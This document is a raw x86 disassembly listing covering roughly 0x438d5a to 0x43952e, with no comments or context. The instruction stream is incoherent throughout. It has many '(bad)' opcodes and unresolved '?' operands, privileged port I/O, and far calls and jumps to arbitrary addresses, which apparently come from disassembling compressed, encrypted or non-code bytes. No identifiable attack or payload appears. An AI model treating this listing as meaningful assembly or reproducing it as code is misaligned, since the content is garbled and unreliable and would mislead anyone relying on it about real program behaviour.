  438d5a:	cs mov bh,0x9b
  438d5d:	daa    
  438d5e:	adc    edi,ebx
  438d60:	sbb    al,0xe7
  438d62:	sbb    dl,BYTE PTR [ebx+0x69]
  438d65:	bsr    ebx,DWORD PTR ds:[edx]
  438d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438d6a:	shl    ecx,cl
  438d6c:	jbe    0x438d82
  438d6e:	in     al,0x8d
  438d70:	call   0x5110:0x2eb1d8bd
  438d77:	daa    
  438d78:	mov    ah,0x42
  438d7a:	push   0x52f0f2f6
  438d7f:	dec    ecx
  438d80:	push   ecx
  438d81:	sub    ah,BYTE PTR [esp+esi*2+0x71]
  438d85:	shr    ah,cl
  438d87:	xchg   DWORD PTR [esi],esp
  438d89:	mov    cl,0x35
  438d8b:	sub    BYTE PTR [esi+ebx*4],bl
  438d8e:	jge    0x438de3
  438d90:	mov    ebp,0x50ffc7f4
  438d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438d96:	xchg   edx,eax
  438d97:	jmp    0x829a83dd
  438d9c:	xchg   esp,eax
  438d9d:	push   DWORD PTR [ebp+0x8]
  438da0:	scas   eax,DWORD PTR es:[edi]
  438da1:	mov    ebx,0xc5d76eb5
  438da6:	bound  ebx,QWORD PTR [ebp+0x46840e7]
  438dac:	nop
  438dad:	std    
  438dae:	fisub  WORD PTR [edx-0x7e]
  438db1:	popf   
  438db2:	in     al,dx
  438db3:	mov    WORD PTR ds:0x5914ba3c,?
  438db9:	push   cs
  438dba:	dec    ebx
  438dbb:	ret    0x9fe2
  438dbe:	(bad)  
  438dc0:	xchg   esi,eax
  438dc1:	outs   dx,DWORD PTR ds:[esi]
  438dc2:	adc    DWORD PTR [edx+esi*8],edx
  438dc5:	test   ch,dh
  438dc7:	jo     0x438d70
  438dc9:	dec    eax
  438dca:	aaa    
  438dcb:	inc    edi
  438dcc:	(bad)  
  438dcd:	push   ds
  438dce:	into   
  438dcf:	push   eax
  438dd0:	ficom  DWORD PTR [ebx]
  438dd2:	jo     0x438d9d
  438dd4:	sbb    dh,BYTE PTR [edx+eax*1]
  438dd7:	mov    ds:0x1c05e5,al
  438ddc:	iret   
  438ddd:	xchg   esi,eax
  438dde:	(bad)  
  438ddf:	clc    
  438de0:	jbe    0x438d82
  438de2:	int3   
  438de3:	aad    0xd3
  438de5:	mov    al,0xf8
  438de7:	cld    
  438de8:	xchg   ch,ch
  438dea:	pushf  
  438deb:	sbb    eax,0x19bda8dd
  438df0:	dec    ebp
  438df1:	mov    ah,0xc2
  438df3:	push   0x2b
  438df5:	push   0xac3a771c
  438dfa:	fistp  DWORD PTR es:[ebp-0x4f]
  438dfe:	sub    eax,0xbef7134f
  438e03:	retf   0xa4a6
  438e06:	push   cs
  438e07:	jnp    0x438dfc
  438e09:	xor    BYTE PTR [ebp+eax*4-0x25833250],0xee
  438e11:	dec    edx
  438e12:	test   al,0x20
  438e14:	and    eax,0x7dc275e2
  438e19:	ins    BYTE PTR es:[edi],dx
  438e1a:	fwait
  438e1b:	mov    dh,0xe6
  438e1d:	rcr    DWORD PTR [edx],cl
  438e1f:	and    BYTE PTR [eax+eiz*4-0x3effbe],bh
  438e26:	call   FWORD PTR [edi]
  438e28:	ror    eax,0x13
  438e2b:	and    DWORD PTR [ebx+0x6077b16],0x11
  438e32:	xor    DWORD PTR [edi-0x64],ecx
  438e35:	jns    0x438de3
  438e37:	pop    edx
  438e38:	mov    ecx,0x497f0735
  438e3d:	out    dx,eax
  438e3e:	fs pop ebx
  438e40:	sbb    al,0x16
  438e42:	pop    ss
  438e43:	mov    ds:0xbe9b50cc,al
  438e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438e49:	jb     0x438e24
  438e4b:	scas   al,BYTE PTR es:[edi]
  438e4c:	dec    edi
  438e4d:	and    ecx,ecx
  438e4f:	(bad)  
  438e50:	test   BYTE PTR [ebx],0x4b
  438e53:	lahf   
  438e54:	or     eax,0x8cf7aaea
  438e59:	mov    bl,0x6b
  438e5b:	cmp    DWORD PTR [ebp-0x69191279],0xc190e5bf
  438e65:	jl     0x438e8d
  438e67:	call   0xbac2:0x163eeb9
  438e6e:	enter  0x7a6c,0x7a
  438e72:	test   DWORD PTR [ebp+0x176c69bc],0x91c3b64b
  438e7c:	adc    edi,DWORD PTR [ebp+edx*4-0x5d]
  438e80:	rol    DWORD PTR [eax+0x37],cl
  438e83:	inc    edx
  438e84:	dec    edx
  438e85:	mov    al,ds:0xab26c18e
  438e8a:	mov    al,ds:0x794667ad
  438e8f:	fidivr DWORD PTR [edx]
  438e91:	lahf   
  438e92:	cmp    BYTE PTR [edi-0x35dc8e5d],cl
  438e98:	push   ds
  438e99:	sub    DWORD PTR [eax+0x491c4de4],esi
  438e9f:	push   cs
  438ea0:	arpl   WORD PTR [ebp+0x138112be],sp
  438ea6:	adc    eax,0x568ec493
  438eab:	mov    eax,ds:0x32b1a7f7
  438eb0:	stc    
  438eb1:	adc    al,0x3a
  438eb3:	jg     0x438ecd
  438eb5:	test   dl,0x4e
  438eb8:	fadd   DWORD PTR [ebp-0x7b]
  438ebb:	ret    
  438ebc:	pop    ebp
  438ebd:	pop    eax
  438ebe:	rcl    DWORD PTR [esi-0x5c],0xce
  438ec2:	cmp    eax,0xa899770f
  438ec7:	int3   
  438ec8:	cli    
  438ec9:	push   edx
  438eca:	(bad)  
  438ecb:	mov    cl,BYTE PTR [esi]
  438ecd:	push   es
  438ece:	mov    dh,0x52
  438ed0:	repz mov cs,edi
  438ed3:	mov    ds:0xbe7a36a1,eax
  438ed8:	dec    eax
  438ed9:	call   0x92c2fff9
  438ede:	lods   eax,DWORD PTR ds:[esi]
  438edf:	push   ds
  438ee0:	mov    ebx,edx
  438ee2:	sbb    BYTE PTR [esi+ecx*4-0x1ce1c5aa],dl
  438ee9:	dec    ecx
  438eea:	xor    BYTE PTR [ebx+ebp*1],ah
  438eed:	pop    ebp
  438eee:	in     eax,dx
  438eef:	ins    BYTE PTR es:[edi],dx
  438ef0:	shr    esi,0xd6
  438ef3:	loopne 0x438f31
  438ef5:	jg     0x438f57
  438ef7:	xor    eax,0xed49363d
  438efc:	clc    
  438efd:	add    al,0x10
  438eff:	int3   
  438f00:	xor    ebx,DWORD PTR [eax-0x48]
  438f03:	and    DWORD PTR [ebx+edx*4],0x1a6d4ef1
  438f0a:	stc    
  438f0b:	outs   dx,DWORD PTR ds:[esi]
  438f0c:	std    
  438f0d:	cmp    DWORD PTR [edx],ecx
  438f0f:	fwait
  438f10:	mov    ecx,DWORD PTR es:[esi]
  438f13:	test   DWORD PTR [eax-0x5b942720],esi
  438f19:	sar    BYTE PTR [esi],0x8e
  438f1c:	sahf   
  438f1d:	test   cl,dh
  438f1f:	push   cs
  438f20:	mov    al,0x33
  438f22:	inc    edi
  438f23:	and    esi,edx
  438f25:	pop    ebx
  438f26:	xor    DWORD PTR [ebp+ebx*1-0x705b1ebe],edx
  438f2d:	sti    
  438f2e:	mul    DWORD PTR [ebx]
  438f30:	enter  0x6b85,0x60
  438f34:	push   esi
  438f35:	in     eax,0xff
  438f37:	lods   eax,DWORD PTR ds:[esi]
  438f38:	popa   
  438f39:	rcr    BYTE PTR [eax-0x47d858d9],1
  438f3f:	sub    eax,0x6dc12489
  438f44:	jbe    0x438fc1
  438f46:	fistp  DWORD PTR [ebx+edx*4-0xbcffb41]
  438f4d:	iret   
  438f4e:	push   0xf82bd5d4
  438f53:	inc    ebx
  438f54:	stc    
  438f55:	bound  esp,QWORD PTR [ebx]
  438f57:	mov    esi,0x35285d35
  438f5c:	dec    ecx
  438f5d:	cmp    ebx,edx
  438f5f:	sbb    DWORD PTR [ecx+0x6a9914b4],eax
  438f65:	shr    BYTE PTR ds:0x5db7f4a8,1
  438f6b:	adc    al,0xe7
  438f6d:	jl     0x438f92
  438f6f:	stos   DWORD PTR es:[edi],eax
  438f70:	mov    edx,0xd44ca3da
  438f75:	loop   0x438f82
  438f77:	or     BYTE PTR [edi+0x35dec21f],0xda
  438f7e:	sbb    bl,BYTE PTR [ecx]
  438f80:	jecxz  0x438f25
  438f82:	cld    
  438f83:	std    
  438f84:	loope  0x438f2e
  438f86:	dec    edx
  438f87:	in     eax,dx
  438f88:	mov    dh,0x3d
  438f8a:	jnp    0x438ff7
  438f8c:	sbb    BYTE PTR [eax-0x60cc295d],dh
  438f92:	clc    
  438f93:	jl     0x438f64
  438f95:	inc    esp
  438f96:	jecxz  0x438fa6
  438f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438f99:	int3   
  438f9a:	jle    0x5b67cc98
  438fa0:	inc    esp
  438fa1:	ret    0x88bc
  438fa4:	mov    esi,0x7e6263ca
  438fa9:	dec    esi
  438faa:	sub    esp,edi
  438fac:	es ret 
  438fae:	in     eax,dx
  438faf:	pop    esp
  438fb0:	lods   al,BYTE PTR ds:[esi]
  438fb1:	pop    ds
  438fb2:	mov    ecx,0x6b4ce845
  438fb7:	dec    edi
  438fb8:	gs je  0x438fb4
  438fbb:	jl     0x438f75
  438fbd:	stc    
  438fbe:	and    eax,0x233d47d2
  438fc3:	sub    BYTE PTR [edi-0x42],bh
  438fc6:	test   eax,edx
  438fc8:	scas   al,BYTE PTR es:[edi]
  438fc9:	adc    eax,0xcac0b59c
  438fce:	fnsave [esi+ebp*2-0x40bf9e05]
  438fd5:	rcr    BYTE PTR ds:0x4b880767,cl
  438fdb:	mov    edx,es
  438fdd:	pop    esi
  438fde:	xor    eax,DWORD PTR [ebx]
  438fe0:	and    al,0x1b
  438fe2:	fidivr WORD PTR [esi]
  438fe4:	push   ebx
  438fe5:	ficom  DWORD PTR [eax]
  438fe7:	fdiv   st(1),st
  438fe9:	int    0xeb
  438feb:	repnz nop
  438fed:	rcr    ebx,0x12
  438ff0:	vunpckhps xmm5,xmm6,XMMWORD PTR [edi]
  438ff4:	jo     0x43905f
  438ff6:	push   ds
  438ff7:	jmp    0x43900f
  438ff9:	out    0x5,eax
  438ffb:	(bad)  
  438ffc:	lods   eax,DWORD PTR ds:[esi]
  438ffd:	pop    ebp
  438ffe:	jge    0x43907d
  439000:	scas   al,BYTE PTR es:[edi]
  439001:	xchg   esi,eax
  439002:	(bad)  
  439003:	xchg   ebx,edx
  439005:	js     0x438fd4
  439007:	fldcw  WORD PTR [edi+0x12]
  43900a:	cmp    BYTE PTR [edx+0x3154a404],bl
  439010:	repnz jmp 0xb85f:0x384767f6
  439018:	cmc    
  439019:	shl    cl,1
  43901b:	bound  eax,QWORD PTR [ecx]
  43901d:	outs   dx,DWORD PTR ds:[esi]
  43901e:	jge    0x439064
  439020:	rcl    edi,cl
  439022:	push   0xf1af1cf8
  439027:	gs jge 0x439077
  43902a:	icebp  
  43902b:	push   edi
  43902c:	call   0xbe9aa498
  439031:	mov    al,ds:0xd3c6b18f
  439036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439037:	and    BYTE PTR [ebx+0x4],0xe2
  43903b:	test   ebx,0x3d33270e
  439041:	mov    bh,0xbb
  439043:	(bad)  
  439044:	and    eax,0x9a3b04cd
  439049:	retf   
  43904a:	test   DWORD PTR [esi-0x13f6db71],eax
  439050:	mul    DWORD PTR [ebx+0xbea4f0e]
  439056:	inc    esi
  439057:	push   esi
  439058:	jbe    0x439011
  43905a:	in     eax,dx
  43905b:	nop
  43905c:	nop
  43905d:	loope  0x4390b7
  43905f:	xor    DWORD PTR fs:[edi],esp
  439062:	scas   eax,DWORD PTR es:[edi]
  439063:	outs   dx,BYTE PTR ds:[esi]
  439064:	retf   
  439065:	popf   
  439066:	ins    BYTE PTR es:[edi],dx
  439067:	inc    esi
  439068:	mov    edi,0x849d50df
  43906d:	inc    edi
  43906e:	dec    eax
  43906f:	ret    0x1c41
  439072:	adc    DWORD PTR [edx+0x7cb6e45d],0xffffff83
  439079:	and    BYTE PTR [eax+0x79dd0b49],bh
  43907f:	jge    0x439037
  439081:	cmp    ah,BYTE PTR [esi]
  439083:	retf   0xd29b
  439086:	jno    0x439055
  439088:	aad    0x10
  43908a:	(bad)  
  43908b:	ja     0x4390bf
  43908d:	(bad)  
  43908e:	push   ecx
  43908f:	fisub  WORD PTR [edi+0x6f56ce68]
  439095:	(bad)  
  439096:	stc    
  439097:	lahf   
  439098:	xor    al,0xea
  43909a:	sbb    eax,0x7f298175
  43909f:	fs (bad) 
  4390a1:	sti    
  4390a2:	dec    esp
  4390a3:	rol    DWORD PTR [esi-0x53],cl
  4390a6:	int3   
  4390a7:	imul   ecx,DWORD PTR [eax],0xb
  4390aa:	xchg   esi,eax
  4390ab:	mov    al,0x6d
  4390ad:	cdq    
  4390ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4390af:	dec    esi
  4390b0:	outs   dx,DWORD PTR ds:[esi]
  4390b1:	cli    
  4390b2:	push   ebp
  4390b3:	push   ebp
  4390b4:	mov    ds:0x1136f00b,al
  4390b9:	add    ch,BYTE PTR [edi+0x3f]
  4390bc:	test   DWORD PTR [edx-0x7],esp
  4390bf:	xor    BYTE PTR [ecx+0x727ab555],cl
  4390c5:	dec    edi
  4390c6:	cmc    
  4390c7:	addr16 pop ebx
  4390c9:	fdivr  QWORD PTR [ecx+edx*2+0x4b]
  4390cd:	inc    esp
  4390ce:	mov    ds:0xf3567df1,eax
  4390d3:	jbe    0x439099
  4390d5:	adc    eax,0xd5ea4991
  4390da:	int3   
  4390db:	or     DWORD PTR [edx-0x5f],edx
  4390de:	mov    ecx,ebx
  4390e0:	ret    
  4390e1:	fidivr DWORD PTR [ecx+0x4260e4e7]
  4390e7:	aas    
  4390e8:	pop    ebx
  4390e9:	je     0x4390f0
  4390eb:	jmp    0x43911f
  4390ed:	xor    al,0xd4
  4390ef:	nop
  4390f0:	fisubr DWORD PTR [esi]
  4390f2:	in     eax,0x2e
  4390f4:	mov    WORD PTR [edx],fs
  4390f6:	pop    ebx
  4390f7:	clc    
  4390f8:	aam    0x9
  4390fa:	pop    eax
  4390fb:	mov    eax,0x199c0111
  439100:	fs test eax,0x59086dfa
  439106:	(bad)  
  439108:	mov    ?,WORD PTR [edi+ebp*8]
  43910b:	mov    ebx,0x300e8e34
  439110:	sar    BYTE PTR [edi-0x34],1
  439113:	aas    
  439114:	dec    edi
  439115:	mov    al,0xac
  439117:	iret   
  439118:	cld    
  439119:	xchg   ecx,eax
  43911a:	pandn  mm6,mm0
  43911d:	and    eax,0xa78bd7eb
  439122:	pop    ebp
  439123:	mov    esi,0xb8ba2e77
  439128:	jle    0x439133
  43912a:	loopne 0x439117
  43912c:	jl     0x4390d8
  43912e:	jecxz  0x4390b9
  439130:	in     al,dx
  439131:	jbe    0x43911f
  439133:	dec    edx
  439134:	(bad)  
  439135:	es xchg edx,eax
  439137:	mov    eax,ds:0xfdb62cd2
  43913c:	mov    bl,0x85
  43913e:	addr16 add eax,0xe8546116
  439144:	xchg   edx,eax
  439145:	add    ecx,ebp
  439147:	cdq    
  439148:	ss inc edx
  43914a:	pop    eax
  43914b:	sbb    al,0x8a
  43914d:	scas   al,BYTE PTR es:[edi]
  43914e:	in     eax,0xcc
  439150:	pop    eax
  439151:	test   al,0x91
  439153:	mov    al,0x4c
  439155:	jnp    0x43910e
  439157:	or     ch,BYTE PTR [edi]
  439159:	ins    BYTE PTR es:[edi],dx
  43915a:	loopne 0x439117
  43915c:	sub    bl,BYTE PTR [eax]
  43915e:	nop
  43915f:	inc    ecx
  439160:	and    BYTE PTR [esi+0xf],cl
  439163:	leave  
  439164:	inc    esi
  439165:	jno    0x4391e5
  439167:	xor    BYTE PTR [ecx+0x60],cl
  43916a:	push   ss
  43916b:	dec    ebp
  43916c:	pop    DWORD PTR [edi-0x12]
  43916f:	jg     0x43918a
  439171:	imul   ebp,DWORD PTR [edi],0x1c
  439174:	jb     0x4391d9
  439176:	dec    edi
  439177:	retf   
  439178:	xchg   edi,eax
  439179:	mov    es,WORD PTR [ecx+eax*4-0x4a]
  43917d:	inc    esi
  43917e:	aas    
  43917f:	mov    es,WORD PTR [edx]
  439181:	lods   al,BYTE PTR ds:[esi]
  439182:	cmp    dh,BYTE PTR [ecx+0x6b]
  439185:	out    dx,al
  439186:	inc    ebp
  439187:	xchg   edx,eax
  439188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439189:	arpl   WORD PTR [edi],ax
  43918b:	jmp    0x4391f6
  43918d:	sub    ah,BYTE PTR [edx-0x43]
  439190:	inc    edx
  439191:	cmp    eax,0x58e799ce
  439196:	and    dh,BYTE PTR [ebx+edi*1-0x70]
  43919a:	ret    0xee32
  43919d:	xor    dh,BYTE PTR [ebp-0x31a317ec]
  4391a3:	mov    bl,0x4e
  4391a6:	jmp    0x1e300a9d
  4391ab:	push   esi
  4391ac:	cmp    dh,BYTE PTR [eax]
  4391ae:	mov    gs,WORD PTR [eax]
  4391b0:	shr    DWORD PTR [ebp-0x3d54a7f7],cl
  4391b6:	mov    ch,0xd8
  4391b8:	(bad)  
  4391ba:	shr    ebx,cl
  4391bc:	ret    0x1118
  4391bf:	test   DWORD PTR [edx+0x14fb0eb1],esp
  4391c5:	add    ebx,esp
  4391c7:	mov    dl,0x28
  4391c9:	test   DWORD PTR [edi+0x54de0430],edx
  4391cf:	dec    ebx
  4391d0:	popf   
  4391d1:	pop    esi
  4391d2:	sub    cl,ah
  4391d4:	(bad)  
  4391d5:	cli    
  4391d6:	stc    
  4391d7:	shl    BYTE PTR [ebp+ebp*4+0x74d7246a],1
  4391de:	dec    ebx
  4391df:	mov    eax,ds:0x5f0a10e0
  4391e4:	je     0x43918a
  4391e6:	je     0x439180
  4391e8:	fmul   QWORD PTR [ebp-0x6839760]
  4391ee:	or     BYTE PTR [ebx+0x7d],dl
  4391f1:	and    ecx,DWORD PTR [ecx-0x4d9c4582]
  4391f7:	pshufw mm4,QWORD PTR [esi+0x2f3b411d],0x4a
  4391ff:	pop    ds
  439200:	cdq    
  439201:	add    eax,0x9a461c4c
  439206:	dec    esp
  439207:	jns    0x4391c0
  439209:	dec    edx
  43920a:	daa    
  43920b:	sbb    DWORD PTR [edx-0x5f],eax
  43920e:	push   eax
  43920f:	push   eax
  439210:	push   esi
  439211:	dec    esi
  439212:	add    ecx,DWORD PTR [edi*1+0xf978385]
  439219:	xor    DWORD PTR [ebp+0xf],0x3ad405c1
  439220:	repz push 0x243c8a6d
  439226:	mov    dh,BYTE PTR [edx]
  439228:	daa    
  439229:	les    ecx,FWORD PTR [edx+ebp*2]
  43922c:	pop    edx
  43922d:	jmp    0x439274
  43922f:	mov    esi,0x58776e67
  439234:	inc    BYTE PTR [ebx]
  439236:	js     0x439217
  439238:	push   edx
  439239:	xchg   edi,esp
  43923b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43923c:	mov    BYTE PTR [ebp-0x7154c514],ah
  439242:	xor    DWORD PTR [edx-0x5cdc12f7],eax
  439248:	or     eax,0x67d4e36f
  43924d:	pop    ebx
  43924e:	xchg   ebx,eax
  43924f:	stos   BYTE PTR es:[edi],al
  439250:	out    0x63,al
  439252:	push   eax
  439253:	jne    0x43924f
  439255:	cmp    ebx,esi
  439257:	or     eax,0x186459ac
  43925c:	push   cs
  43925d:	sbb    esi,ecx
  43925f:	inc    edx
  439260:	mov    dl,0x19
  439262:	pop    es
  439263:	fabs   
  439265:	and    edi,ebx
  439267:	push   ds
  439268:	xlat   BYTE PTR ds:[ebx]
  439269:	adc    al,0x23
  43926b:	jmp    0x25c0dd70
  439270:	or     BYTE PTR ds:[edi-0x5a],dh
  439274:	mov    ecx,esp
  439276:	je     0x4391fe
  439278:	xor    dl,BYTE PTR [esi]
  43927a:	(bad)  
  43927b:	retf   
  43927c:	xchg   BYTE PTR [ecx],ch
  43927e:	and    eax,0xeffbd508
  439283:	adc    eax,0xb2945091
  439288:	bound  eax,QWORD PTR [edx+0x52]
  43928b:	in     al,0x5e
  43928d:	cli    
  43928e:	and    eax,0xe92c5c96
  439293:	sub    dh,ah
  439295:	call   0x18f10284
  43929a:	call   0x162c0596
  43929f:	xchg   edx,eax
  4392a0:	dec    BYTE PTR [ebx-0x6d]
  4392a3:	test   BYTE PTR [esi+0x37e2cd1b],al
  4392a9:	add    dl,BYTE PTR [ebx]
  4392ab:	cdq    
  4392ac:	mov    bl,0x54
  4392ae:	imul   ebp,ebx,0x3c
  4392b1:	in     al,dx
  4392b2:	mov    dl,dh
  4392b4:	push   ebp
  4392b5:	adc    dl,BYTE PTR [esp+ebp*2-0x46ac754]
  4392bc:	push   es
  4392bd:	aas    
  4392be:	cmp    dh,bl
  4392c0:	jmp    0x4392a9
  4392c2:	xor    BYTE PTR [edx+0x7d],dh
  4392c5:	pop    ecx
  4392c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4392c7:	push   0xffffffab
  4392c9:	fwait
  4392ca:	ja     0x43930c
  4392cc:	fild   WORD PTR [ebp+0x11dbb6eb]
  4392d2:	fwait
  4392d3:	call   0x4311:0xb8d59e06
  4392da:	dec    ecx
  4392db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4392dc:	jp     0x439286
  4392de:	imul   eax,DWORD PTR [ecx-0x10],0xffffffda
  4392e2:	xchg   edx,eax
  4392e3:	ret    0xeca9
  4392e6:	push   ebp
  4392e7:	xlat   BYTE PTR ds:[ebx]
  4392e8:	mov    dl,0xa5
  4392ea:	cdq    
  4392eb:	in     eax,0x53
  4392ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4392ee:	pop    eax
  4392ef:	add    DWORD PTR [eax+0x36],ecx
  4392f2:	inc    esi
  4392f3:	jge    0x439294
  4392f5:	hlt    
  4392f6:	leave  
  4392f7:	mov    al,0xec
  4392f9:	xchg   esp,eax
  4392fa:	lock mov bh,0x77
  4392fd:	jbe    0x4392ba
  4392ff:	sub    dh,bl
  439301:	mov    ds:0xc11fca56,eax
  439306:	pop    ds
  439307:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439308:	lock dec BYTE PTR [ebp+0x4707b01c]
  43930f:	pop    eax
  439310:	pop    es
  439311:	jo     0x4392a0
  439313:	aas    
  439314:	jmp    0x4392fc
  439316:	ja     0x43935b
  439318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439319:	addr16 xor eax,0x39a4bab5
  43931f:	cdq    
  439320:	fsubr  DWORD PTR [ebp+0x1c]
  439323:	rol    DWORD PTR [ebp-0x5f34a0a7],cl
  439329:	ss call 0x178a:0xea5f7b40
  439331:	fdiv   DWORD PTR [ebp-0x54]
  439334:	inc    eax
  439335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439336:	add    BYTE PTR [esi-0x21953802],0x6d
  43933d:	fld    QWORD PTR [ebp+0x1f]
  439340:	and    BYTE PTR [edx-0x14d2acd8],0x50
  439347:	rol    DWORD PTR ds:0x5bf7d911,cl
  43934d:	mov    eax,ds:0x4ddabdd4
  439352:	push   ebx
  439353:	add    eax,eax
  439355:	push   edx
  439356:	inc    esi
  439357:	adc    cl,BYTE PTR [eax-0x5f]
  43935a:	icebp  
  43935b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43935c:	dec    ecx
  43935d:	imul   esp,DWORD PTR cs:[esi],0x569131c8
  439364:	aaa    
  439365:	xchg   edi,eax
  439366:	test   ebx,esp
  439368:	arpl   WORD PTR [edx-0x67],di
  43936b:	call   0x8999:0x6ff5ffa8
  439372:	inc    ebx
  439373:	mov    ebx,0xed4e9588
  439378:	call   0xb5436b6b
  43937d:	dec    ecx
  43937e:	outs   dx,BYTE PTR ds:[esi]
  43937f:	aam    0x5
  439381:	xor    BYTE PTR [edx+0x5c],bl
  439384:	je     0x439382
  439386:	push   edx
  439387:	adc    edx,DWORD PTR [esi-0x1860de3]
  43938d:	pop    ecx
  43938e:	sub    eax,0x3cd2812b
  439393:	push   0xe0ee0467
  439398:	inc    edx
  439399:	int    0xfe
  43939b:	es sahf 
  43939d:	add    edx,DWORD PTR [ebx+0x36]
  4393a0:	cmp    al,0x1d
  4393a2:	mov    ebx,0x771bb506
  4393a7:	cmp    cl,BYTE PTR [esi-0x301b265f]
  4393ad:	ret    
  4393ae:	push   edi
  4393af:	cmp    al,0x4
  4393b1:	(bad)  
  4393b2:	das    
  4393b3:	lds    esi,FWORD PTR [eax+eiz*1]
  4393b6:	adc    ebp,DWORD PTR [esi]
  4393b8:	adc    eax,0xe446de1
  4393bd:	adc    esp,DWORD PTR [edi+ecx*4-0x5a]
  4393c1:	adc    ecx,DWORD PTR [ecx+0x48]
  4393c4:	(bad)  
  4393c5:	fs scas eax,DWORD PTR es:[edi]
  4393c7:	mov    al,0xa2
  4393c9:	jne    0x439401
  4393cb:	mov    edx,0xcb372d51
  4393d0:	jg     0x4393f1
  4393d2:	std    
  4393d3:	out    dx,al
  4393d4:	repnz sub edx,ecx
  4393d7:	pop    ss
  4393d8:	or     al,0x48
  4393da:	ins    BYTE PTR es:[edi],dx
  4393db:	mov    ebp,0xb1cde6fa
  4393e0:	mov    dl,0xd1
  4393e2:	xor    ebx,esi
  4393e4:	pop    esi
  4393e5:	cmp    al,BYTE PTR [esi-0x577f3790]
  4393eb:	add    BYTE PTR [edx*8+0x436da18a],dh
  4393f2:	out    0x62,eax
  4393f4:	and    cl,BYTE PTR [edx]
  4393f6:	mov    esi,0x5300ef55
  4393fb:	(bad)  
  4393fc:	adc    edx,esp
  4393fe:	lahf   
  4393ff:	and    al,0xd9
  439401:	les    edx,FWORD PTR [edi]
  439403:	or     DWORD PTR [ebp+0x40],ecx
  439406:	std    
  439407:	adc    al,0x97
  439409:	or     esi,ecx
  43940b:	dec    edx
  43940c:	ja     0x4393e3
  43940e:	push   0xe8ce5cf1
  439413:	bound  esi,QWORD PTR [ebp+0x74f88622]
  439419:	dec    edi
  43941a:	add    edx,DWORD PTR [ebp-0x3]
  43941d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43941e:	call   0x5cb91751
  439423:	rol    DWORD PTR ds:0xc992621,1
  439429:	imul   esp,DWORD PTR [ebx-0x7de239f1],0x5d
  439430:	dec    DWORD PTR [edx+0x5cb49409]
  439436:	push   0xffffffdf
  439438:	ret    0x921d
  43943b:	je     0x4393e9
  43943d:	icebp  
  43943e:	ins    DWORD PTR es:[edi],dx
  43943f:	test   DWORD PTR [ecx-0xc],edi
  439442:	sub    al,BYTE PTR [edi+0x26]
  439445:	jle    0x43948d
  439447:	sub    ebp,ebp
  439449:	xor    BYTE PTR [edx+edx*2],bl
  43944c:	mov    WORD PTR ds:[ecx+ebp*2-0x23],gs
  439451:	mov    cl,0x79
  439453:	and    sp,si
  439456:	mov    ebp,0x84e9b64a
  43945b:	jle    0x439447
  43945d:	hlt    
  43945e:	xor    al,0xe6
  439460:	(bad)
  439463:	mov    WORD PTR [eax-0x25fa9972],cs
  439469:	jmp    0x3931:0x6bde01c0
  439470:	mov    WORD PTR [edi-0x1d],fs
  439473:	inc    ebx
  439474:	mov    dh,0xc9
  439476:	mov    ?,WORD PTR [ecx-0x57]
  439479:	(bad)  [edi-0x12]
  43947c:	dec    esi
  43947d:	add    bl,BYTE PTR [ebx+eax*8-0x50d5393]
  439484:	dec    ebx
  439485:	aam    0x28
  439487:	adc    al,0x7d
  439489:	mov    ebp,DWORD PTR [edx+edx*4-0x544d04a4]
  439490:	pop    eax
  439491:	(bad)  
  439492:	in     eax,dx
  439493:	jecxz  0x439427
  439495:	loopne 0x439433
  439497:	xchg   DWORD PTR [edx+ebp*1-0x1446d66f],ebp
  43949e:	cdq    
  43949f:	jo     0x439441
  4394a1:	sbb    edx,ebp
  4394a3:	test   DWORD PTR [eax-0xe7d7d60],ebp
  4394a9:	addr16 inc ecx
  4394ab:	repnz sti 
  4394ad:	aad    0xf
  4394af:	or     al,0xcf
  4394b1:	cmp    ah,BYTE PTR [ebx+0x2]
  4394b4:	daa    
  4394b5:	rol    DWORD PTR [eax+0x5e14cb03],1
  4394bb:	inc    eax
  4394bc:	pop    ds
  4394bd:	cli    
  4394be:	fisttp QWORD PTR [esi-0x2d1d81a]
  4394c4:	jbe    0x43950a
  4394c6:	mov    esp,0x29d889c5
  4394cb:	pop    eax
  4394cc:	add    eax,0x6556f294
  4394d1:	and    ebp,DWORD PTR [ecx+esi*1-0x7f5b6d56]
  4394d8:	scas   eax,DWORD PTR es:[edi]
  4394d9:	push   ebx
  4394da:	mov    cl,0x16
  4394dc:	leave  
  4394dd:	push   es
  4394de:	sub    DWORD PTR ds:0x11903e45,ecx
  4394e4:	xchg   ecx,eax
  4394e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4394e6:	xchg   edi,eax
  4394e7:	mov    ebp,0x183f7eaf
  4394ec:	cmp    ebx,edi
  4394ee:	mov    ds:0xb7daa3f,al
  4394f3:	mov    BYTE PTR [edx+esi*4],cl
  4394f6:	mov    al,ds:0x64191a48
  4394fb:	adc    al,0x16
  4394fd:	lods   al,BYTE PTR ds:[esi]
  4394fe:	aad    0xa8
  439500:	mov    ebx,0x19bad7d7
  439505:	xchg   ebp,eax
  439506:	rol    WORD PTR [edx+0x27],0xe2
  43950b:	cmp    al,0xfc
  43950d:	push   esp
  43950e:	or     edi,DWORD PTR [edx-0x316bce82]
  439514:	call   0xd42f8d62
  439519:	sub    eax,0x5a1c90e2
  43951e:	sub    BYTE PTR [edi-0x1c],bl
  439521:	push   edx
  439522:	mov    ds:0x3457ca90,al
  439527:	(bad)  
  439528:	pop    ebp
  439529:	jecxz  0x4394ff
  43952b:	push   esi
  43952c:	ret    
  43952d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43952e:	call   0xc79f:0x8a37f4e9
